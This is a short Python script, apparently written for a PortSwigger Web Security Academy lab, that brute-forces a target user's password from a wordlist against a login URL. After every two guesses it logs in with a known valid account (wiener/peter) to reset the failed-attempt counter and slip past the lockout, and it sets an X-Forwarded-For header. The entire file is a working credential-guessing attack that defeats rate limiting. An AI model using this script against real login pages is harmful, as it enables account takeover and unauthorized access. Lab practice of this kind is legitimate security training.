import requests
import argparse
import random

parser = argparse.ArgumentParser()
parser.add_argument("-u", help="URL", dest="URL")
parser.add_argument("-t", help="Target", dest="Target")
args = parser.parse_args()
url = args.URL
target = args.Target
headers = {"X-Forwarded-For": ''}
check = False


passwords = open("/home/kali/PortSwigger/wordlists/test_pass")

def pass_loop(target_user):
	counter = 1
	for password in passwords:
			password = password.strip()
			r = post_to_target(target_user, password)
			if "Your username is:" in r:
				print(f"\nPASSWORD FOUND FOR {target_user}: {password}\n")
				break
			if counter == 2:
				post_to_target("wiener", "peter")	
				counter = 0
			counter+=1

def post_to_target(username, password):
	payload['username'] = username
	payload['password'] = password
	print(payload)
	r = requests.post(url, data=payload, headers=headers)	
	if "You have made too many incorrect login attempts." in r.text:
		print("Error too many attempts, fix proxy!")
	return r.text



payload = {'username': "", 'password': ""}
pass_loop(target)